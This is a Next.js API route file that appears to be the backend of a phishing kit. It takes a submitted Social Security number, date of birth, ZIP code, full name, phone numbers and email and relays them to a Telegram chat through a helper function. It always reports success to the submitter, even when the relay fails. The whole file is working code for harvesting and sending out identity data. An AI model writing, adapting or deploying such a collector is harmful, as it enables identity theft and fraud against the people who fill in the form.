import { NextRequest, NextResponse } from 'next/server';
import { sendTelegramMessage } from '@/lib/telegram';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const ssn = body?.ssn ?? '';
    const dob = body?.dob ?? '';
    const zipcode = body?.zipcode ?? '';
    const fullname = body?.fullname ?? '';
    const homephone = body?.homephone ?? '';
    const workphone = body?.workphone ?? '';
    const email = body?.email ?? '';
    try {
      await sendTelegramMessage(
        { ssn, dob, zipcode, fullname, homephone, workphone, email },
        'details',
      );
    } catch (e) {
      console.error('Telegram send failed:', e);
    }
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error in details API:', error);
    return NextResponse.json({ success: true });
  }
}


